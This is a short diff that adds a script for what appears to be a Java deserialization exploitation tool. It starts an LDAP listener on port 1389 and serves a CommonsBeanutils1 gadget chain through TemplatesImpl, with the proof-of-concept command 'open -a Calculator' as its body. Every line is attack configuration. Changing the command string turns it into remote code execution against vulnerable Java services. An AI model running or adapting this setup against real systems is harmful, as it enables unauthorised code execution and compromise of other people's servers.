@@ -1,0 +1,6 @@
+use exploit LDAPLocalChainListener
+use payload CommonsBeanutils1
+use bullet TemplatesImplBullet
+set lport 1389
+set body "open -a Calculator"
+run
